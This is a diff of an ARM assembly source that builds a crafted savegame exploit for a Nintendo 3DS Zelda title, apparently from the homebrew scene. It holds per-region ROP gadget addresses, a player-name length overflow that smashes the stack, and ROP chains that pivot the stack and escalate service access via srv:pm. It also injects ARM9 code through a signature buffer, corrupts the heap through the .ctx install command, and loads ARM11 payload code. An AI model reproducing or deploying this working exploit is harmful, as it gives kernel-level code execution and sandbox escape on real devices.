@@ -4,121 +4,80 @@
 
 //Note that all code addresses in the form of L_<addr> referenced here are for the USA game.
 
+#define ROPKIT_TMPDATA 0x0FFFC000
+
+#define ROPKIT_LINEARMEM_REGIONBASE 0x14000000
+
+#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x700000)
+
+#include "ropkit_ropinclude.s"
+
 #if REGION!=0//Non-JPN
-#define svcControlMemory 0x301a0c
 #define svcConnectToPort 0x2fa7b8
-#define svcGetProcessId 0x30794c
 #else//JPN
-#define svcControlMemory 0x301524
 #define svcConnectToPort 0x2fa2d0
-#define svcGetProcessId 0x307464
 #endif
 
 #if REGION!=0//Non-JPN
 #define srvinit_RegisterClient 0x30df98 //Calls srv_RegisterClient(), increments *r6, L_30aedc(sp+0), then executes "pop {r3, r4, r5, r6, r7, pc}". L_30aedc decreases *(inr0+8) by 1, and returns if that's >0 after decreasing it.
-#define srv_GetServiceHandle 0x30dde8
 #else//JPN
 #define srvinit_RegisterClient 0x30dab0
-#define srv_GetServiceHandle 0x30d900
 #endif
 
 #define GETPROCID 0x409bec //Calls svcGetProcessId, "mov r0, r4", then pop {r3, r4, r5, pc}
 #define CLOSEHANDLE 0x400ae4+4 //mov r4, r0. ptr = inr0, if(*ptr)svcCloseHandle(*ptr). *ptr = 0, r0 = ptr, "pop {r4, pc}".
-#define COND_THROWFATALERR 0x2135ec //This calls THROWFATALERR if r0 bit31 is set, then executes: pop {r3, r4, r5, r6, r7, r8, r9, pc}
 
 #if REGION!=0//Non-JPN
 #define THROWFATALERR 0x3351b4
 #define GETTHREADSTORAGE 0x2db5ac //Stores r0 from "mrc 15, 0, r0, cr13, cr0, {3}" to r3+4, increments the word @ r3+8, r0=1 then pop {r4} bx	lr
-#define LDRR0 0x2d1230 //ldr r0, [r0] then bx lr
 #define ADDSHIFTVAL_BLXR3 0x3201dc //r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
-#define SLEEP_THREAD 0x30e604
 #else//JPN
 #define THROWFATALERR 0x334ccc
 #define GETTHREADSTORAGE 0x2db0c4
-#define LDRR0 0x2d0d48
 #define ADDSHIFTVAL_BLXR3 0x31fcf4
-#define SLEEP_THREAD 0x30e11c
-#endif
-
-#define GSPGPU_HANDLEADR 0x00558aac
-
-#define CODE_ALIGNEDSIZE 0x45b000
-
-#if FWVER < 0x25
-#define TEXT_APPMEM_OFFSET CODE_ALIGNEDSIZE //Physmem offset to .text, relative to APPLICATION mem-region end.
-#else
-#define TEXT_APPMEM_OFFSET (CODE_ALIGNEDSIZE - 0x5B000)
 #endif
 
 #if REGION==1 //USA
 #define SENDCMDADR 0x4360a0 //Writes r0 to r4+0, then copies 0x80-bytes from r1 to r4+4. Then uses svcSendSyncRequest with handle *r5.
-#define GXLOWCMD_0 0x49398c
-#define GXLOWCMD_4 0x493b94 //inr0=src addr inr1=dst addr inr2=size inr3=width0? insp0=height0? insp4=width1? insp8=height1? insp12=flags
-#define GSP_CMD8 0x453f44 //inr0 = addr, inr1 = size
-#define THREADINIT_LOCALSTORAGE 0x435f68 //This is the initialization func called by the thread entrypoint code, prior to calling the actual thread entrypoint funcptr.
-#define svcCreateThread 0x422180
-#define ROP_POPR3_ADDSPR3_POPPC 0x4a5ac4 // "pop	{r3}" "add sp, sp, r3" "pop {pc}"
 #elif REGION==2 //EUR
 #define SENDCMDADR 0x4360c4
-#define GXLOWCMD_0 0x4939ac
-#define GXLOWCMD_4 0x493bb4
-#define GSP_CMD8 0x453f64
-#define THREADINIT_LOCALSTORAGE 0x435f8c
-#define svcCreateThread 0x4221a4
-#define ROP_POPR3_ADDSPR3_POPPC 0x4a5ae4
 #elif REGION==0 //JPN
 #define SENDCMDADR 0x436078
-#define GXLOWCMD_0 0x493964
-#define GXLOWCMD_4 0x493b6c
-#define GSP_CMD8 0x453f1c
-#define THREADINIT_LOCALSTORAGE 0x435f40
-#define svcCreateThread 0x422158
-#define ROP_POPR3_ADDSPR3_POPPC 0x4a5a9c
 #else
 #error Invalid region.
 #endif
 
 #if REGION!=0//Non-JPN
-#define RDSAVEBEGINADR 0x324eac+4
+/*#define RDSAVEBEGINADR 0x324eac+4
 #define WRSAVEBEGINADR 0x2e613c+4
-#define SAVECTXDESTORYADR 0x31b99c+0xc
+#define SAVECTXDESTORYADR 0x31b99c+0xc*/
 #define FSMNTSAVEADR 0x2fc0c8+4 //This is after this instruction: "push {r3, r4, r5, lr}"
 #define FSUMNTADR 0x2fbfa8+4
 
 #define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
-#define MEMCPY 0x34338c
-#define MEMSET 0x32b184 //r0=adr, r1=size. The first instruction here is "r2=0", therefore jumping to +4 allows controlling the value which is written to the buffer.
 #define ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 0x3255dc //ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0] ; bx lr
 
-#define DSP_SHUTDOWN 0x2ce818
 #else//JPN
-#define RDSAVEBEGINADR 0x3249c4+4
+/*#define RDSAVEBEGINADR 0x3249c4+4
 #define WRSAVEBEGINADR 0x2e5c54+4
-#define SAVECTXDESTORYADR 0x31b4b4+0xc
+#define SAVECTXDESTORYADR 0x31b4b4+0xc*/
 #define FSMNTSAVEADR 0x2fbbe0+4
 #define FSUMNTADR 0x2fbac0
 
 #define BLXR6 0x2c40f8
-#define MEMCPY 0x342ea4
-#define MEMSET 0x32ac9c
 #define ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 0x3250f4
 
-#define DSP_SHUTDOWN 0x2ce330
 #endif
 
 #define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
-#define REGPOP24ADR 0x1aca7c //Addr of this instruction: "pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}"
 #define REGPOPR0R3SL 0x4a8964 //Addr of this instruction: "pop {r0, r1, r2, r3, sl, ip, pc}"
 #define REGPOPR5R6 0x4b7cb0 //Addr of this instruction: "pop {r5, r6, pc}"
-#define POPPC 0x1048a4 //Addr of this instruction: "pop {pc}"
-#define STACKMEMCPYADR 0x1aa988
+//#define STACKMEMCPYADR 0x1aa988
 
 #define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x174de8 //"str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
 
 #define RSAINFO_OFF 0x880+0x40
 
-#define SAVEADR 0x587958
-#define SAVESLOTSADR 0x55bec0
 #define SRVACCESS_OFF 0xf00 //Savegame offset for the new service access control.
 #define ARM9CODE_OFF 0xb00+0x40
 #define ARM9CODE_SIZE 0x200-0x40
@@ -159,8 +118,8 @@
 
 #define PSPS_SIGBUFSIZE 0x7440//This is for FW1F. FW0B=0xD9B8.
 
-#define START_ROPTHREAD
-#define THREADSTART_ROPCHAINOFF 0x13dc
+//#define START_ROPTHREAD
+//#define THREADSTART_ROPCHAINOFF 0x13dc
 
 #if EXECHAX==3
 //These addresses are for FW1F.
@@ -177,7 +136,7 @@
 .macro SENDCMD HANDLE, CMDID, BUF
 .word REGPOPADR
 .word 0, 0, 0 @ r0-r2
-.word SAVEADR+0x1040 @ r3
+.word ROPBUF+0x1040 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
 .word GETTHREADSTORAGE @ r6
@@ -197,25 +156,22 @@
 .word 0 @ sl
 .word REGPOPADR
 
-.word SAVEADR+0x1044 @ r0
+.word ROPBUF+0x1044 @ r0
 .word 0x20 @ r1
 .word 0 @ r2
 .word 0 @ r3
 .word 0x10 @ r4
 .word 0 @ r5
-.word LDRR0 @ r6
+.word ROP_LDR_R0FROMR0 @ r6
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6
 
-.word 0, 0 @ d8
+.word POP_R4R5R6PC
+
 .word 0 @ r4
-.word SAVEADR+0x1018 @ r5, +0x38 is a classptr.
+.word ROPBUF+0x1018 @ r5, +0x38 is a classptr.
 .word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
 .word ADDSHIFTVAL_BLXR3
 
 .word \CMDID @ r0, CmdID
@@ -234,16 +190,14 @@
 .word 0 @ r5
 .word 0 @ r6
 #if EXECHAX!=3 //The .ctx install command will return an error since the input data is invalid, therefore disable this conditional fatal-error call when using the .ctx install cmd hax.
-.word COND_THROWFATALERR
-
-.word 0, 0, 0, 0, 0, 0, 0
+COND_THROWFATALERR
 #endif
 .endm
 
 _start:
 .word 0xbb, 0x01, 0x8000, 0xe0ba, 0x1, 0x57, 0x57
 .hword 0x48, 0x61, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78 @ UTF-16 "Haxxxxxx"
-.byte 0x9a + 0x14 @ Length of player-name in utf16-chars, so byte-size is u8 value<<1. The player-name string is copied to the output buffer using lenval<<1, without checking the size or for NUL-termination. With the length used here, this results in a stack-smash once in-game function(s) load this string(see README).
+.byte 0x9a + 0x2 /* + 0x14*/ @ Length of player-name in utf16-chars, so byte-size is u8 value<<1. The player-name string is copied to the output buffer using lenval<<1, without checking the size or for NUL-termination. With the length used here, this results in a stack-smash once in-game function(s) load this string(see README).
 .byte 0x01, 0x02, 0x00
 .ascii "ZELDAZ"
 .hword 0x428
@@ -274,31 +228,26 @@ _start:
 .word 0x7fff, 0xc0, 0xfa6f, 0xf3f7e3ff
 .word 0x253060
 
-.word REGPOPADR @ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
+@ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
+/*.word REGPOPADR
 .word 0 @ r0: Doesn't matter here, since the code jumped to immediately does "mov r0, sp".
 #ifndef START_ROPTHREAD
-.word SAVEADR+0x180 @ r1: Buffer which will be copied to stack.
+.word ROPBUF + (ropstackstart - _start) @ r1: Buffer which will be copied to stack.
 .word 0x700 @ r2: Size of data to copy.
 #else
-.word SAVEADR+THREADSTART_ROPCHAINOFF @ r1: Src buffer
+.word ROPBUF+THREADSTART_ROPCHAINOFF @ r1: Src buffer
 .word 0x80 @ r2
 #endif
 .word 0 @ r3
-.word SAVEADR @ r4
+.word ROPBUF @ r4
 .word 0, 0, 0, 0
-.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see the end of this .s.
+.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see the end of this .s.*/
+
+.word ROP_POPR3_ADDSPR3_POPPC @ Stack-pivot to ropstackstart.
+.word (ROPBUF + (ropstackstart - _start)) - (0x0ffffcc0+0x4)
 
 .space (_start + 0x180) - .
-
-.word 0 @ r0
-.word 0 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ fp
-.word 0 @ ip
+ropstackstart:
 
 #ifdef REPLACE_SRVACCESSCONTROL
 .word REGPOPADR
@@ -315,45 +264,32 @@ _start:
 
 .word 0 @ r4
 
+@ Outhandle is @ 0x00558ad4.
+@ 0x4e7480 is "srv:", 0x4e7485 is "srv:pm".
+CALLFUNC_NOSP svcConnectToPort, 0x00558ad4, 0x4e7485, 0, 0
+
+COND_THROWFATALERR
+
 .word REGPOPADR
-.word 0x00558ad4 @ r0, Output handle
-.word 0x4e7485 @ r1, service name. 0x4e7480 is "srv:", 0x4e7485 is "srv:pm".
+.word 0 @ r0
+.word 0 @ r1
 .word 0 @ r2
 .word 0 @ r3
-.word 0x0f @ r4
+.word 0 @ r4
 .word 0 @ r5
-.word svcConnectToPort @ r6
+.word ROPBUF+0x13bc @ r6
 .word 0 @ fp
 .word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-.word COND_THROWFATALERR
-
-.word 0 @ r3
-.word 0 @ r4
-.word 0 @ r5
-.word SAVEADR+0x13bc @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
 .word srvinit_RegisterClient
 
-.word SAVEADR+0x13bc @ r3/sp0
+.word ROPBUF+0x13bc @ r3/sp0
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
 .word 0 @ r7
 
 .word REGPOPADR
-.word SAVEADR+0x1080 @ r0
+.word ROPBUF+0x1080 @ r0
 .word 0xffff8001 @ r1
 .word 0 @ r2
 .word 0 @ r3
@@ -366,215 +302,49 @@ _start:
 
 .word 0, 0, 0
 
-SENDCMD 0x00558ad4, 0x04040040, SAVEADR+0x1080 @ Unregister this process from srv:pm.
-SENDCMD 0x00558ad4, 0x04030082, SAVEADR+0x1080 @ Register this process with srv:pm, with new service access control.
+SENDCMD 0x00558ad4, 0x04040040, ROPBUF+0x1080 @ Unregister this process from srv:pm.
+SENDCMD 0x00558ad4, 0x04030082, ROPBUF+0x1080 @ Register this process with srv:pm, with new service access control.
 #endif
 
 #if EXECHAX==0
-.word REGPOPADR
-.word SAVEADR+0x1040 @ r0, Out handle
-.word SAVEADR+SRVACCESS_OFF + 0x9*8 @ r1, Service name ptr "ps:ps".
-.word 5 @ r2, Service name length
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word srv_GetServiceHandle @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+@ Get the session handle for "ps:ps", outhandle @ ROPBUF+0x1040.
+CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUF+0x1040, (ROPBUF+SRVACCESS_OFF + 0x9*8), 5, 0
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
+COND_THROWFATALERR
 
-.word COND_THROWFATALERR
-.word 0, 0, 0, 0, 0, 0, 0
+@ Copy the ARM9 code to the beginning of the signature buffer.
+CALLFUNC_NOSP MEMCPY, 0x08000000, ROPBUF+ARM9CODE_OFF, ARM9CODE_SIZE, 0
 
-.word REGPOPADR
-.word 0x08000000 @ r0, Dst signature buffer+0
-.word SAVEADR+ARM9CODE_OFF @ r1, Src ARM9 code
-.word ARM9CODE_SIZE @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6 @ Copy the ARM9 code to the beginning of the signature buffer.
+CALLFUNC_NOSP MEMSET32_OTHER+4, 0x08000000+0x200, PSPS_SIGBUFSIZE-0x200, PXIPS9_BUF, 0
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-.word REGPOPADR
-.word 0x08000000+0x200 @ r0, Buffer
-.word PSPS_SIGBUFSIZE-0x200 @ r1, Size
-.word PXIPS9_BUF @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMSET+4 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-SENDCMD SAVEADR+0x1040, 0x00020244, SAVEADR+0x1100
+SENDCMD ROPBUF+0x1040, 0x00020244, ROPBUF+0x1100
 
 .word THROWFATALERR
 
 #endif
 
 #if EXECHAX==3
-.word REGPOPADR
-.word SAVEADR+0x1040 @ r0, Out handle
-.word SAVEADR+SRVACCESS_OFF + 0xb*8 @ r1, Service name ptr "am:net".
-.word 6 @ r2, Service name length
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word srv_GetServiceHandle @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+@ Get the session handle for "am:net", outhandle @ ROPBUF+0x1040.
+CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUF+0x1040, (ROPBUF+SRVACCESS_OFF + 0xb*8), 6, 0
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
+COND_THROWFATALERR
 
-.word COND_THROWFATALERR
-.word 0, 0, 0, 0, 0, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER+4, HEAPHAX_INPUTBUF, HEAPHAX_BUFSIZE, 0xffffffff, 0
 
-.word REGPOPADR
-.word HEAPHAX_INPUTBUF @ r0, Buffer
-.word HEAPHAX_BUFSIZE @ r1, Size
-.word 0xffffffff @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMSET+4 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+@ Copy the RSA-2048 "cert" used to trigger an error so that the .ctx install cmd aborts processing the cert buffer data.
+CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF, ROPBUF+RSAINFO_OFF, 0x280, 0
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
+@ Copy the ARM9 code.
+CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE, ROPBUF+ARM9CODE_OFF, ARM9CODE_SIZE, 0
 
-.word REGPOPADR
-.word HEAPHAX_INPUTBUF @ r0, Dst buffer
-.word SAVEADR+RSAINFO_OFF @ r1, Src RSA-2048 "cert" used to trigger an error so that the .ctx install cmd aborts processing the cert buffer data.
-.word 0x280 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+@ Copy the memchunk header.
+CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE+0x200+0x88, ROPBUF+HEAPCHUNK_SAVEOFF, 0x10, 0
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
+@ Copy the heap memctx data to heapbuf+0x2800.
+CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+0x2800, ROPBUF+HEAPCHUNK_SAVEOFF+0x10, 0x3c+8, 0
 
-.word REGPOPADR
-.word HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE @ r0, Dst buffer
-.word SAVEADR+ARM9CODE_OFF @ r1, Src ARM9 code
-.word ARM9CODE_SIZE @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-.word REGPOPADR
-.word HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE+0x200+0x88 @ r0, Dst buffer
-.word SAVEADR+HEAPCHUNK_SAVEOFF @ r1, Src memchunk header
-.word 0x10 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-.word REGPOPADR
-.word HEAPHAX_INPUTBUF+0x2800 @ r0, Dst buffer
-.word SAVEADR+HEAPCHUNK_SAVEOFF+0x10 @ r1, Src memctx data
-.word 0x3c+8 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6 @ Copy the heap memctx data to heapbuf+0x2800.
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-SENDCMD SAVEADR+0x1040, 0x08190108, SAVEADR+0x1180 @ CTX install cmd
-SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
+SENDCMD ROPBUF+0x1040, 0x08190108, ROPBUF+0x1180 @ CTX install cmd
+SENDCMD ROPBUF+0x1040, 0x00190040, ROPBUF+0x1200 @ ReloadDBS
 
 .word HAXWORD
 #endif
@@ -593,8 +363,8 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word FSMNTSAVEADR @ Mount the savegame "data:" archive.
 
 .word 0, 0, 0
-.word REGPOPADR
-.word SAVEADR+0x1000 @ r0, File path
+/*.word REGPOPADR
+.word ROPBUF+0x1000 @ r0, File path
 .word 0x2cd2b4 @ r1, Buffer
 .word ARM11CODE_OFF+ARM11CODE_SIZE @ r2, Size
 .word 0 @ r3
@@ -604,180 +374,44 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0, 0, 0, 0, 0, 0, 0
 .word SAVECTXDESTORYADR
 
-.word 0
+.word 0*/
+
+CALLFUNC_NOSP IFile_Open, ROPBUF+0x1044, ROPBUF+0x1000, 1, 0
+
+CALLFUNC_NOSP IFile_Read, ROPBUF+0x1044, ROPBUF+0x1048, 0x2cd2b4, ARM11CODE_OFF+ARM11CODE_SIZE
+
+ROPMACRO_IFile_Close ROPBUF+0x1044
+
 .word REGPOPADR
 .word 0x3071d8
 .word 0, 0, 0
 .word 0, 0, 0, 0, 0
 .word FSUMNTADR
-
 .word 0, 0, 0, 0, 0, 0
+
 .word 0x2cd2b4+ARM11CODE_OFF
 #endif
 
 #if EXECHAX==2
 .word REGPOPADR
-.word 0x14700000 @ r0, Dst
-.word SAVEADR+ARM11CODE_OFF @ r1, Src ARM11 code
-.word ARM11CODE_SIZE @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word MEMCPY @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-.word REGPOPADR
-.word 0x14700000 @ r0, Addr
-.word ARM11CODE_SIZE @ r1, Size
-.word 0 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word GSP_CMD8 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6 @ Flush the DCache for the code copied to 0x14700000.
-
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-
-//The following determines the actual APPMEMALLOC via checking configmem APPMEMTYPE, since the configmem APPMEMALLOC is fixed to 0x04000000 even on New3DS.
-
-.word REGPOPADR
-.word (gxcpy_appmemtype_ropword-_start) + SAVEADR @ r0
-.word 0x1FF80030-4 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0x10 @ r4
-.word 0 @ r5
-.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6 @ Copy configmem APPMEMTYPE to gxcpy_appmemtype_ropword.
-
-.word 0, 0
-.word 0
-.word 0
-.word 0, 0, 0, 0, 0
-
-.word REGPOPADR @ This ROP sets r4 to (appmemtype_appmemsize_table-4) + APPMEMTYPE*4.
-.word ((appmemtype_appmemsize_table - 4) -_start) + SAVEADR @ r0
-gxcpy_appmemtype_ropword:
+.word 0x3071d8 @ r0
 .word 0 @ r1
 .word 0 @ r2
 .word 0 @ r3
 .word 0 @ r4
-.word SAVEADR+0x1018 @ r5, +0x38 is a classptr.
-.word 0 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word ADDSHIFTVAL_BLXR3 @ r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
-
-@ Write r4 to gxcpy_appmemsizeptr_ropword.
-.word ((gxcpy_appmemsizeptr_ropword-_start) + SAVEADR) - 0x2b0 @ r0
-.word 0 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0 @ sl
-.word 0 @ ip
-
-.word ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC @ "str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
-
-.word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
-
-.word REGPOPADR
-.word (gxcpy_dstaddr_ropword-_start) + SAVEADR @ r0
-gxcpy_appmemsizeptr_ropword:
-.word 0x0 @ r1, written by the above ROP.
-.word (0x14000000 - TEXT_APPMEM_OFFSET)>>3 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
 .word 0 @ fp
 .word 0 @ ip
-.word BLXR6 @ Calculate the linearmem address of .text on-the-fly.
+.word FSMNTSAVEADR @ Mount the savegame "data:" archive.
 
-.word 0, 0
-.word 0
-.word 0
-.word 0, 0, 0, 0, 0
+.word 0, 0, 0
 
-.word REGPOPADR
-.word (gxcpy_dstaddr-_start) + SAVEADR @ r0
-.word ((gxcpy_dstaddr_ropword-4)-_start) + SAVEADR @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0x10 @ r4
-.word 0 @ r5
-.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6 @ Copy gxcpy_dstaddr_ropword to gxcpy_dstaddr.
+#include "ropkit_boototherapp.s"
 
-.word 0, 0
-.word 0
-.word 0
-.word 0, 0, 0, 0, 0
-
-.word REGPOPADR//This code exec method uses GX command4 to copy arm11code using GPU DMA, to .text.
-.word 0x14700000 @ r0, GPU DMA src addr
-gxcpy_dstaddr_ropword:
-.word 0x0 @ r1, GPU DMA dst addr. The actual addr gets written by the above ROP.
-.word ARM11CODE_SIZE @ r2, size
-.word 0 @ r3, width0
-.word 0x0f @ r4
-.word 0 @ r5
-.word GXLOWCMD_4 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8 / insp0 = height0, insp4 = width1
-.word 0 @ insp8 = height1
-.word 0x8 @ insp12, flags
-.word 0, 0, 0, 0, 0
-.word COND_THROWFATALERR
-.word 0, 0, 0, 0, 0, 0, 0
-
-.word REGPOPADR @ Call sleep_thread() since GX commands returns before the operation finishes.
-.word 1000000000 @ r0
-.word 0 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word SLEEP_THREAD @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
-
-.word 0, 0 @ d8
-.word 0
-.word 0, 0, 0, 0, 0, 0
-.word 0x00100000
-
-gxcpy_dstaddr:
-.word 0
+ropkit_cmpobject:
+.word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
+.fill (0x40 / 4), 4, ROP_POPR3_ADDSPR3_POPPC @ Vtable
 #endif
 
 /*.word REGPOPADR
@@ -1009,378 +643,6 @@ arm9_loadaddr:
 .space (_start + ARM9CODE_OFF + ARM9CODE_SIZE) - . @ ARM9 code section end.
 #endif
 
-#ifndef ARM9HAX
-.space (_start + ARM11CODE_OFF) - .
-arm11code:
-add r1, pc, #1
-bx r1
-.thumb
-
-arm11code_start:
-ldr r0, =(0x10000000 - 0x3800)
-mov sp, r0
-
-sub sp, sp, #32
-
-ldr r0, =0x14313890 @ Overwrite the main-screen framebuffers for framebuf A. http://3dbrew.org/wiki/GPU_Registers
-ldr r1, =0x46500
-ldr r2, =0x13333337
-
-arm11_memclear:
-str r2, [r0]
-add r0, r0, #4
-add r2, r2, #4
-sub r1, r1, #4
-bne arm11_memclear
-
-ldr r1, =0x46500
-add r0, r0, #0x10
-
-arm11_memclear2:
-str r2, [r0]
-add r0, r0, #4
-add r2, r2, #4
-sub r1, r1, #4
-bne arm11_memclear2
-
-ldr r2, =GSP_CMD8//flushdcache
-ldr r0, =0x14313890
-ldr r1, =(0x46500*2)+0x10
-blx r2
-
-#ifndef DISABLE_DSPSHUTDOWN
-ldr r0, =DSP_SHUTDOWN
-blx r0
-#endif
-
-add r0, sp, #16 @ Out handle
-adr r1, arm11code_servname @ Service name ptr "fs:USER"
-mov r2, #7 @ Service name length
-mov r3, #0
-ldr r4, =srv_GetServiceHandle
-blx r4
-bl throw_fatalerr_check
-
-add r0, sp, #16
-bl fsuser_initialize
-bl throw_fatalerr_check
-
-mov r0, #1
-str r0, [sp, #0] @ openflags
-add r0, sp, #20
-str r0, [sp, #4] @ fileout handle*
-add r0, sp, #16 @ fsuser handle
-mov r1, #4 @ archiveid
-adr r2, arm11code_payloadpath
-adr r3, arm11code_payloadpath_end
-sub r3, r3, r2
-bl fsuser_openfiledirectly
